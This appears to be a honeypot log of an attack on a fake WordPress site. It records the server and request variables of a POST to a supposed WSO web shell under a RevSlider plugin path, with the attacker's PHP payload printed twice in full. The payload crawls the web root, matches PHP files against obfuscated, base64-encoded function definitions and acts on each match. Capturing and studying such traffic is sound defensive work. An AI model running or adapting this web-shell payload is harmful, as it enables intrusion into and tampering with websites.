
_SERVER
Array
(
    [UNIQUE_ID] => XRwF9uiDu-ta-nUejlev-AAAABk
    [SCRIPT_URL] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_URI] => http://stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [HTTP_HOST] => stratigery.com
    [HTTP_CONNECTION] => close
    [CONTENT_LENGTH] => 33939
    [HTTP_ACCEPT_LANGUAGE] => en-US,en;q=0.8
    [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393
    [HTTP_REFERER] => http://stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [HTTP_COOKIE] => 227e948fdbaaeccbbb7b3f42fbe848e8=227e948fdbaaeccbbb7b3f42fbe848e8; d8670190bc460b6abebf276d20db5892=b5a1f74aa075abe4df55b71032de71ba
    [CONTENT_TYPE] => application/x-www-form-urlencoded
    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/bin
    [SERVER_SIGNATURE] => 
    [SERVER_SOFTWARE] => Apache/2.4.39 (Unix) PHP/7.3.6
    [SERVER_NAME] => stratigery.com
    [SERVER_ADDR] => 162.246.45.144
    [SERVER_PORT] => 80
    [REMOTE_ADDR] => 162.144.181.154
    [DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [REQUEST_SCHEME] => http
    [CONTEXT_PREFIX] => 
    [CONTEXT_DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [SERVER_ADMIN] => bediger8@gmail.com
    [SCRIPT_FILENAME] => /srv/http/stratigery/htdocs/fake_wp/wso.php
    [REMOTE_PORT] => 56826
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.0
    [REQUEST_METHOD] => POST
    [QUERY_STRING] => 
    [REQUEST_URI] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_NAME] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [PHP_SELF] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [REQUEST_TIME_FLOAT] => 1562117622.871
    [REQUEST_TIME] => 1562117622
)

_REQUEST
Array
(
    [a] => RC
    [p1] => eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo3Njp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czo3OiJyb2hvbHRsIjtpOjI7czoxMDoiZ2F4ZXdzZWFmayI7fWk6MTthOjM6e2k6MDtpOjU7aToxO3M6NToicmhobnUiO2k6MjtzOjk6Imdja2NjYmNrdSI7fWk6MjthOjM6e2k6MDtpOjE1O2k6MTtzOjQ6InJvZmYiO2k6MjtzOjEwOiJnYnNqZnhia21vIjt9aTozO2E6Mzp7aTowO2k6MTg7aToxO3M6NzoicnZjZm1pYSI7aToyO3M6MTE6Imdha2NpbnNrZGh0Ijt9aTo0O2E6Mzp7aTowO2k6MjM7aToxO3M6MTE6InJvbG1tc3dvaXBzIjtpOjI7czo2OiJndXNzbGkiO31pOjU7YTozOntpOjA7aTozNjtpOjE7czo0OiJybmVrIjtpOjI7czo4OiJndXN5ZG9lbSI7fWk6NjthOjM6e2k6MDtpOjQyO2k6MTtzOjU6InJzcnJ0IjtpOjI7czoxMToiZ2xtZW95dHNiamgiO31pOjc7YTozOntpOjA7aTo1NDtpOjE7czo0OiJyZmtjIjtpOjI7czoxMDoiZ2dzbW5rbXl3YiI7fWk6ODthOjM6e2k6MDtpOjYwO2k6MTtzOjY6InJ4ZXlxbiI7aToyO3M6NDoiZ3dpaCI7fWk6OTthOjM6e2k6MDtpOjg5O2k6MTtzOjg6InJudGhnYnhhIjtpOjI7czo1OiJnbnlldSI7fWk6MTA7YTozOntpOjA7aToxMDk7aToxO3M6OToicmJxeHB1b29qIjtpOjI7czo0OiJnend3Ijt9aToxMTthOjM6e2k6MDtpOjExMDtpOjE7czo1OiJybGlobSI7aToyO3M6OToiZ3RhbnRleW92Ijt9aToxMjthOjM6e2k6MDtpOjExMTtpOjE7czo3OiJyd2J0ZXh5IjtpOjI7czoxMDoiZ2pnb2p6dHhvbCI7fWk6MTM7YTozOntpOjA7aToxMTI7aToxO3M6NDoicnV0aSI7aToyO3M6NjoiZ3VmZWhrIjt9aToxNDthOjM6e2k6MDtpOjExNTtpOjE7czoxMDoicnp6bXJwc3R0dCI7aToyO3M6ODoiZ2piaGNyd2oiO31pOjE1O2E6Mzp7aTowO2k6MTE4O2k6MTtzOjg6InJmY3VhZG52IjtpOjI7czoxMDoiZ2pweXdhanNoaCI7fWk6MTY7YTozOntpOjA7aToxMjY7aToxO3M6NzoicmpmeHFqcyI7aToyO3M6NToiZ2lieWIiO31pOjE3O2E6Mzp7aTowO2k6MTI3O2k6MTtzOjU6InJ0dXhhIjtpOjI7czo5OiJndXRmcGNjeGciO31pOjE4O2E6Mzp7aTowO2k6MTMwO2k6MTtzOjQ6InJmaGUiO2k6MjtzOjEwOiJnbHBtanV5a2Z4Ijt9aToxOTthOjM6e2k6MDtpOjEzNDtpOjE7czo0OiJyc2NlIjtpOjI7czo4OiJnaGNzZWFrcyI7fWk6MjA7YTozOntpOjA7aToxMzg7aToxO3M6NToicnZqd20iO2k6MjtzOjQ6Imdvd3YiO31pOjIxO2E6Mzp7aTowO2k6MTQ4O2k6MTtzOjk6InJ4aGhxbXVmdyI7aToyO3M6OToiZ2V0dnFoamppIjt9aToyMjthOjM6e2k6MDtpOjE1NztpOjE7czo5OiJycWNkdndocHIiO2k6MjtzOjU6ImdidGp3Ijt9aToyMzthOjM6e2k6MDtpOjE2MztpOjE7czo0OiJycW5xIjtpOjI7czoxMToiZ255dWZmcXNsYXMiO31pOjI0O2E6Mzp7aTowO2k6MTcyO2k6MTtzOjEwOiJya3htamtmZGhnIjtpOjI7czo3OiJnZXRwdm5lIjt9aToyNTthOjM6e2k6MDtpOjE3NDtpOjE7czoxMToicnJ4bXhqa25tbngiO2k6MjtzOjg6ImdrY3Z0d3ljIjt9aToyNjthOjM6e2k6MDtpOjE3OTtpOjE7czoxMDoicmp6dGZzeG1zcyI7aToyO3M6NjoiZ3BjenlzIjt9aToyNzthOjM6e2k6MDtpOjE4NztpOjE7czo0OiJycmF0IjtpOjI7czo5OiJndWtyaGNveHkiO31pOjI4O2E6Mzp7aTowO2k6MTg5O2k6MTtzOjExOiJyaG5pem5qa29hYiI7aToyO3M6NjoiZ3VkYmpiIjt9aToyOTthOjM6e2k6MDtpOjE5MjtpOjE7czo4OiJya2RudGpleSI7aToyO3M6NToiZ2tibWMiO31pOjMwO2E6Mzp7aTowO2k6MTk2O2k6MTtzOjEwOiJybmFjcXJmeG9tIjtpOjI7czo4OiJndHJkaGF2ZCI7fWk6MzE7YTozOntpOjA7aToxOTg7aToxO3M6MTA6InJxeHV0c3VkYmwiO2k6MjtzOjg6Imd2YmZtaXRmIjt9aTozMjthOjM6e2k6MDtpOjE5OTtpOjE7czo4OiJydXJmdGloZiI7aToyO3M6OToiZ2pvc2pub3V6Ijt9aTozMzthOjM6e2k6MDtpOjIwMDtpOjE7czo2OiJyc3lxdGUiO2k6MjtzOjEwOiJnanpjanZoa2F5Ijt9aTozNDthOjM6e2k6MDtpOjIwMTtpOjE7czo1OiJyZm1vaiI7aToyO3M6NjoiZ2hkdHdzIjt9aTozNTthOjM6e2k6MDtpOjIwMztpOjE7czo4OiJydml5dWF2biI7aToyO3M6NjoiZ3RqbWppIjt9aTozNjthOjM6e2k6MDtpOjIwNjtpOjE7czo4OiJyc3BidHZ4ciI7aToyO3M6MTA6ImdjZG9wd3p6d3EiO31pOjM3O2E6Mzp7aTowO2k6MjA5O2k6MTtzOjQ6InJnamoiO2k6MjtzOjY6ImdsYnFqZCI7fWk6Mzg7YTozOntpOjA7aToyMTA7aToxO3M6MTE6InJmb3JmcXRpZmpkIjtpOjI7czo5OiJnZHp1d3Zjb2wiO31pOjM5O2E6Mzp7aTowO2k6MjEyO2k6MTtzOjQ6InJreW0iO2k6MjtzOjEwOiJndG52cWlwYmJuIjt9aTo0MDthOjM6e2k6MDtpOjIxMztpOjE7czoxMToicnNjY2ljc2tvdm8iO2k6MjtzOjg6Imd2d2Z4eWRtIjt9aTo0MTthOjM6e2k6MDtpOjIxNDtpOjE7czo4OiJyZmN3YmNyYSI7aToyO3M6NToiZ2Vod3AiO31pOjQyO2E6Mzp7aTowO2k6MjE1O2k6MTtzOjk6InJsdGhkbnR0biI7aToyO3M6NzoiZ2hzaHdwdiI7fWk6NDM7YTozOntpOjA7aToyMTY7aToxO3M6MTA6InJ2aXNsamdxaG8iO2k6MjtzOjQ6ImdmcHoiO31pOjQ0O2E6Mzp7aTowO2k6MjE3O2k6MTtzOjEwOiJyaWFxbmtpemtiIjtpOjI7czo5OiJnYWdqa3R3aXIiO31pOjQ1O2E6Mzp7aTowO2k6MjE4O2k6MTtzOjU6InJpaXR3IjtpOjI7czo4OiJnZm5yeHBqbiI7fWk6NDY7YTozOntpOjA7aToyMjE7aToxO3M6ODoicnVqa3pzZWkiO2k6MjtzOjU6Imd0ZWRxIjt9aTo0NzthOjM6e2k6MDtpOjIyMjtpOjE7czoxMToicnpudXRxbXRnZGgiO2k6MjtzOjEwOiJnZGh6bmtwdGF3Ijt9aTo0ODthOjM6e2k6MDtpOjIyMztpOjE7czo1OiJyc21vbSI7aToyO3M6NDoiZ2FvYSI7fWk6NDk7YTozOntpOjA7aToyMjQ7aToxO3M6NzoicnJxdm1xayI7aToyO3M6NToiZ3VvcG0iO31pOjUwO2E6Mzp7aTowO2k6MjI1O2k6MTtzOjExOiJycmN4cWdqcndjcCI7aToyO3M6NjoiZ253a2VpIjt9aTo1MTthOjM6e2k6MDtpOjIzMDtpOjE7czo4OiJybGVwb3BxayI7aToyO3M6MTA6ImdpdmRrcGJ4bG4iO31pOjUyO2E6Mzp7aTowO2k6MjMyO2k6MTtzOjExOiJyaG5iYWNnYmhwcSI7aToyO3M6MTE6ImdlY2hibnZsam5sIjt9aTo1MzthOjM6e2k6MDtpOjIzNTtpOjE7czoxMDoicmZqenh6YmVlaiI7aToyO3M6MTE6Imd3Y2RnaHl1a3JiIjt9aTo1NDthOjM6e2k6MDtpOjIzNjtpOjE7czoxMDoicmVxYWVycWRtbyI7aToyO3M6NToiZ21reW4iO31pOjU1O2E6Mzp7aTowO2k6MjM3O2k6MTtzOjEwOiJya3hpY3VubmJiIjtpOjI7czo4OiJnbXB5am5ydyI7fWk6NTY7YTozOntpOjA7aToyMzg7aToxO3M6NToicnV3eHEiO2k6MjtzOjEwOiJnaXpiZXdpcXZpIjt9aTo1NzthOjM6e2k6MDtpOjIzOTtpOjE7czo1OiJyanpjdSI7aToyO3M6NToiZ3F0d28iO31pOjU4O2E6Mzp7aTowO2k6MjQwO2k6MTtzOjU6InJpZXV3IjtpOjI7czo1OiJnZ3JsZyI7fWk6NTk7YTozOntpOjA7aToyNDE7aToxO3M6MTE6InJtcnB0ZWhpdm95IjtpOjI7czo2OiJnd3Nxc2giO31pOjYwO2E6Mzp7aTowO2k6MjQyO2k6MTtzOjc6InJ6bmpsbWQiO2k6MjtzOjQ6ImdpYnUiO31pOjYxO2E6Mzp7aTowO2k6MjQzO2k6MTtzOjU6InJ4aXlhIjtpOjI7czoxMDoiZ3h4cWtkb2pwbCI7fWk6NjI7YTozOntpOjA7aToyNDQ7aToxO3M6NDoicmN2biI7aToyO3M6NToiZ3dmb3AiO31pOjYzO2E6Mzp7aTowO2k6MjQ1O2k6MTtzOjQ6InJicWEiO2k6MjtzOjk6Imdsb2RndWRobCI7fWk6NjQ7YTozOntpOjA7aToyNDY7aToxO3M6ODoicmF2aXVuZmciO2k6MjtzOjU6ImdkeG56Ijt9aTo2NTthOjM6e2k6MDtpOjI0NztpOjE7czoxMDoicnBqeXVmenF2ZCI7aToyO3M6NToiZ3pid2MiO31pOjY2O2E6Mzp7aTowO2k6MjQ4O2k6MTtzOjg6InJjYnF0d3pvIjtpOjI7czoxMToiZ3NrZHRzcGRkb2IiO31pOjY3O2E6Mzp7aTowO2k6MjQ5O2k6MTtzOjY6InJjcmRnbCI7aToyO3M6OToiZ2J4endjYnZyIjt9aTo2ODthOjM6e2k6MDtpOjI1MDtpOjE7czo3OiJycnJsbmh6IjtpOjI7czo2OiJna3FpZ3kiO31pOjY5O2E6Mzp7aTowO2k6MjUxO2k6MTtzOjQ6InJ3eWMiO2k6MjtzOjExOiJneWZhdXNya3JmeiI7fWk6NzA7YTozOntpOjA7aToyNTI7aToxO3M6NToicnVxcXoiO2k6MjtzOjEwOiJndHRqcWdmZXhzIjt9aTo3MTthOjM6e2k6MDtpOjI1MztpOjE7czoxMToicmNzdXBwbGpta3ciO2k6MjtzOjY6ImdxcWhzeCI7fWk6NzI7YTozOntpOjA7aToyNTQ7aToxO3M6NzoicnBuaHh3cyI7aToyO3M6NToiZ2hoengiO31pOjczO2E6Mzp7aTowO2k6MjU1O2k6MTtzOjg6InJpamRsYmJ0IjtpOjI7czo3OiJndmJ0eGh3Ijt9aTo3NDthOjM6e2k6MDtpOjI1NjtpOjE7czoxMToicnZncXBwcnRwaHAiO2k6MjtzOjU6Imd4dnl2Ijt9aTo3NTthOjM6e2k6MDtpOjI1NztpOjE7czo5OiJyYm11YXRzaGciO2k6MjtzOjU6ImdkdWJpIjt9fQ=="));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();
)

_COOKIE
 Array
(
    [227e948fdbaaeccbbb7b3f42fbe848e8] => 227e948fdbaaeccbbb7b3f42fbe848e8
    [d8670190bc460b6abebf276d20db5892] => b5a1f74aa075abe4df55b71032de71ba
)

_FILES
 
END _FILES
 $my_blog=http://stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider
Acting as WSO, login cookie.
a = RC
p1 = eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo3Njp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czo3OiJyb2hvbHRsIjtpOjI7czoxMDoiZ2F4ZXdzZWFmayI7fWk6MTthOjM6e2k6MDtpOjU7aToxO3M6NToicmhobnUiO2k6MjtzOjk6Imdja2NjYmNrdSI7fWk6MjthOjM6e2k6MDtpOjE1O2k6MTtzOjQ6InJvZmYiO2k6MjtzOjEwOiJnYnNqZnhia21vIjt9aTozO2E6Mzp7aTowO2k6MTg7aToxO3M6NzoicnZjZm1pYSI7aToyO3M6MTE6Imdha2NpbnNrZGh0Ijt9aTo0O2E6Mzp7aTowO2k6MjM7aToxO3M6MTE6InJvbG1tc3dvaXBzIjtpOjI7czo2OiJndXNzbGkiO31pOjU7YTozOntpOjA7aTozNjtpOjE7czo0OiJybmVrIjtpOjI7czo4OiJndXN5ZG9lbSI7fWk6NjthOjM6e2k6MDtpOjQyO2k6MTtzOjU6InJzcnJ0IjtpOjI7czoxMToiZ2xtZW95dHNiamgiO31pOjc7YTozOntpOjA7aTo1NDtpOjE7czo0OiJyZmtjIjtpOjI7czoxMDoiZ2dzbW5rbXl3YiI7fWk6ODthOjM6e2k6MDtpOjYwO2k6MTtzOjY6InJ4ZXlxbiI7aToyO3M6NDoiZ3dpaCI7fWk6OTthOjM6e2k6MDtpOjg5O2k6MTtzOjg6InJudGhnYnhhIjtpOjI7czo1OiJnbnlldSI7fWk6MTA7YTozOntpOjA7aToxMDk7aToxO3M6OToicmJxeHB1b29qIjtpOjI7czo0OiJnend3Ijt9aToxMTthOjM6e2k6MDtpOjExMDtpOjE7czo1OiJybGlobSI7aToyO3M6OToiZ3RhbnRleW92Ijt9aToxMjthOjM6e2k6MDtpOjExMTtpOjE7czo3OiJyd2J0ZXh5IjtpOjI7czoxMDoiZ2pnb2p6dHhvbCI7fWk6MTM7YTozOntpOjA7aToxMTI7aToxO3M6NDoicnV0aSI7aToyO3M6NjoiZ3VmZWhrIjt9aToxNDthOjM6e2k6MDtpOjExNTtpOjE7czoxMDoicnp6bXJwc3R0dCI7aToyO3M6ODoiZ2piaGNyd2oiO31pOjE1O2E6Mzp7aTowO2k6MTE4O2k6MTtzOjg6InJmY3VhZG52IjtpOjI7czoxMDoiZ2pweXdhanNoaCI7fWk6MTY7YTozOntpOjA7aToxMjY7aToxO3M6NzoicmpmeHFqcyI7aToyO3M6NToiZ2lieWIiO31pOjE3O2E6Mzp7aTowO2k6MTI3O2k6MTtzOjU6InJ0dXhhIjtpOjI7czo5OiJndXRmcGNjeGciO31pOjE4O2E6Mzp7aTowO2k6MTMwO2k6MTtzOjQ6InJmaGUiO2k6MjtzOjEwOiJnbHBtanV5a2Z4Ijt9aToxOTthOjM6e2k6MDtpOjEzNDtpOjE7czo0OiJyc2NlIjtpOjI7czo4OiJnaGNzZWFrcyI7fWk6MjA7YTozOntpOjA7aToxMzg7aToxO3M6NToicnZqd20iO2k6MjtzOjQ6Imdvd3YiO31pOjIxO2E6Mzp7aTowO2k6MTQ4O2k6MTtzOjk6InJ4aGhxbXVmdyI7aToyO3M6OToiZ2V0dnFoamppIjt9aToyMjthOjM6e2k6MDtpOjE1NztpOjE7czo5OiJycWNkdndocHIiO2k6MjtzOjU6ImdidGp3Ijt9aToyMzthOjM6e2k6MDtpOjE2MztpOjE7czo0OiJycW5xIjtpOjI7czoxMToiZ255dWZmcXNsYXMiO31pOjI0O2E6Mzp7aTowO2k6MTcyO2k6MTtzOjEwOiJya3htamtmZGhnIjtpOjI7czo3OiJnZXRwdm5lIjt9aToyNTthOjM6e2k6MDtpOjE3NDtpOjE7czoxMToicnJ4bXhqa25tbngiO2k6MjtzOjg6ImdrY3Z0d3ljIjt9aToyNjthOjM6e2k6MDtpOjE3OTtpOjE7czoxMDoicmp6dGZzeG1zcyI7aToyO3M6NjoiZ3BjenlzIjt9aToyNzthOjM6e2k6MDtpOjE4NztpOjE7czo0OiJycmF0IjtpOjI7czo5OiJndWtyaGNveHkiO31pOjI4O2E6Mzp7aTowO2k6MTg5O2k6MTtzOjExOiJyaG5pem5qa29hYiI7aToyO3M6NjoiZ3VkYmpiIjt9aToyOTthOjM6e2k6MDtpOjE5MjtpOjE7czo4OiJya2RudGpleSI7aToyO3M6NToiZ2tibWMiO31pOjMwO2E6Mzp7aTowO2k6MTk2O2k6MTtzOjEwOiJybmFjcXJmeG9tIjtpOjI7czo4OiJndHJkaGF2ZCI7fWk6MzE7YTozOntpOjA7aToxOTg7aToxO3M6MTA6InJxeHV0c3VkYmwiO2k6MjtzOjg6Imd2YmZtaXRmIjt9aTozMjthOjM6e2k6MDtpOjE5OTtpOjE7czo4OiJydXJmdGloZiI7aToyO3M6OToiZ2pvc2pub3V6Ijt9aTozMzthOjM6e2k6MDtpOjIwMDtpOjE7czo2OiJyc3lxdGUiO2k6MjtzOjEwOiJnanpjanZoa2F5Ijt9aTozNDthOjM6e2k6MDtpOjIwMTtpOjE7czo1OiJyZm1vaiI7aToyO3M6NjoiZ2hkdHdzIjt9aTozNTthOjM6e2k6MDtpOjIwMztpOjE7czo4OiJydml5dWF2biI7aToyO3M6NjoiZ3RqbWppIjt9aTozNjthOjM6e2k6MDtpOjIwNjtpOjE7czo4OiJyc3BidHZ4ciI7aToyO3M6MTA6ImdjZG9wd3p6d3EiO31pOjM3O2E6Mzp7aTowO2k6MjA5O2k6MTtzOjQ6InJnamoiO2k6MjtzOjY6ImdsYnFqZCI7fWk6Mzg7YTozOntpOjA7aToyMTA7aToxO3M6MTE6InJmb3JmcXRpZmpkIjtpOjI7czo5OiJnZHp1d3Zjb2wiO31pOjM5O2E6Mzp7aTowO2k6MjEyO2k6MTtzOjQ6InJreW0iO2k6MjtzOjEwOiJndG52cWlwYmJuIjt9aTo0MDthOjM6e2k6MDtpOjIxMztpOjE7czoxMToicnNjY2ljc2tvdm8iO2k6MjtzOjg6Imd2d2Z4eWRtIjt9aTo0MTthOjM6e2k6MDtpOjIxNDtpOjE7czo4OiJyZmN3YmNyYSI7aToyO3M6NToiZ2Vod3AiO31pOjQyO2E6Mzp7aTowO2k6MjE1O2k6MTtzOjk6InJsdGhkbnR0biI7aToyO3M6NzoiZ2hzaHdwdiI7fWk6NDM7YTozOntpOjA7aToyMTY7aToxO3M6MTA6InJ2aXNsamdxaG8iO2k6MjtzOjQ6ImdmcHoiO31pOjQ0O2E6Mzp7aTowO2k6MjE3O2k6MTtzOjEwOiJyaWFxbmtpemtiIjtpOjI7czo5OiJnYWdqa3R3aXIiO31pOjQ1O2E6Mzp7aTowO2k6MjE4O2k6MTtzOjU6InJpaXR3IjtpOjI7czo4OiJnZm5yeHBqbiI7fWk6NDY7YTozOntpOjA7aToyMjE7aToxO3M6ODoicnVqa3pzZWkiO2k6MjtzOjU6Imd0ZWRxIjt9aTo0NzthOjM6e2k6MDtpOjIyMjtpOjE7czoxMToicnpudXRxbXRnZGgiO2k6MjtzOjEwOiJnZGh6bmtwdGF3Ijt9aTo0ODthOjM6e2k6MDtpOjIyMztpOjE7czo1OiJyc21vbSI7aToyO3M6NDoiZ2FvYSI7fWk6NDk7YTozOntpOjA7aToyMjQ7aToxO3M6NzoicnJxdm1xayI7aToyO3M6NToiZ3VvcG0iO31pOjUwO2E6Mzp7aTowO2k6MjI1O2k6MTtzOjExOiJycmN4cWdqcndjcCI7aToyO3M6NjoiZ253a2VpIjt9aTo1MTthOjM6e2k6MDtpOjIzMDtpOjE7czo4OiJybGVwb3BxayI7aToyO3M6MTA6ImdpdmRrcGJ4bG4iO31pOjUyO2E6Mzp7aTowO2k6MjMyO2k6MTtzOjExOiJyaG5iYWNnYmhwcSI7aToyO3M6MTE6ImdlY2hibnZsam5sIjt9aTo1MzthOjM6e2k6MDtpOjIzNTtpOjE7czoxMDoicmZqenh6YmVlaiI7aToyO3M6MTE6Imd3Y2RnaHl1a3JiIjt9aTo1NDthOjM6e2k6MDtpOjIzNjtpOjE7czoxMDoicmVxYWVycWRtbyI7aToyO3M6NToiZ21reW4iO31pOjU1O2E6Mzp7aTowO2k6MjM3O2k6MTtzOjEwOiJya3hpY3VubmJiIjtpOjI7czo4OiJnbXB5am5ydyI7fWk6NTY7YTozOntpOjA7aToyMzg7aToxO3M6NToicnV3eHEiO2k6MjtzOjEwOiJnaXpiZXdpcXZpIjt9aTo1NzthOjM6e2k6MDtpOjIzOTtpOjE7czo1OiJyanpjdSI7aToyO3M6NToiZ3F0d28iO31pOjU4O2E6Mzp7aTowO2k6MjQwO2k6MTtzOjU6InJpZXV3IjtpOjI7czo1OiJnZ3JsZyI7fWk6NTk7YTozOntpOjA7aToyNDE7aToxO3M6MTE6InJtcnB0ZWhpdm95IjtpOjI7czo2OiJnd3Nxc2giO31pOjYwO2E6Mzp7aTowO2k6MjQyO2k6MTtzOjc6InJ6bmpsbWQiO2k6MjtzOjQ6ImdpYnUiO31pOjYxO2E6Mzp7aTowO2k6MjQzO2k6MTtzOjU6InJ4aXlhIjtpOjI7czoxMDoiZ3h4cWtkb2pwbCI7fWk6NjI7YTozOntpOjA7aToyNDQ7aToxO3M6NDoicmN2biI7aToyO3M6NToiZ3dmb3AiO31pOjYzO2E6Mzp7aTowO2k6MjQ1O2k6MTtzOjQ6InJicWEiO2k6MjtzOjk6Imdsb2RndWRobCI7fWk6NjQ7YTozOntpOjA7aToyNDY7aToxO3M6ODoicmF2aXVuZmciO2k6MjtzOjU6ImdkeG56Ijt9aTo2NTthOjM6e2k6MDtpOjI0NztpOjE7czoxMDoicnBqeXVmenF2ZCI7aToyO3M6NToiZ3pid2MiO31pOjY2O2E6Mzp7aTowO2k6MjQ4O2k6MTtzOjg6InJjYnF0d3pvIjtpOjI7czoxMToiZ3NrZHRzcGRkb2IiO31pOjY3O2E6Mzp7aTowO2k6MjQ5O2k6MTtzOjY6InJjcmRnbCI7aToyO3M6OToiZ2J4endjYnZyIjt9aTo2ODthOjM6e2k6MDtpOjI1MDtpOjE7czo3OiJycnJsbmh6IjtpOjI7czo2OiJna3FpZ3kiO31pOjY5O2E6Mzp7aTowO2k6MjUxO2k6MTtzOjQ6InJ3eWMiO2k6MjtzOjExOiJneWZhdXNya3JmeiI7fWk6NzA7YTozOntpOjA7aToyNTI7aToxO3M6NToicnVxcXoiO2k6MjtzOjEwOiJndHRqcWdmZXhzIjt9aTo3MTthOjM6e2k6MDtpOjI1MztpOjE7czoxMToicmNzdXBwbGpta3ciO2k6MjtzOjY6ImdxcWhzeCI7fWk6NzI7YTozOntpOjA7aToyNTQ7aToxO3M6NzoicnBuaHh3cyI7aToyO3M6NToiZ2hoengiO31pOjczO2E6Mzp7aTowO2k6MjU1O2k6MTtzOjg6InJpamRsYmJ0IjtpOjI7czo3OiJndmJ0eGh3Ijt9aTo3NDthOjM6e2k6MDtpOjI1NjtpOjE7czoxMToicnZncXBwcnRwaHAiO2k6MjtzOjU6Imd4dnl2Ijt9aTo3NTthOjM6e2k6MDtpOjI1NztpOjE7czo5OiJyYm11YXRzaGciO2k6MjtzOjU6ImdkdWJpIjt9fQ=="));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();
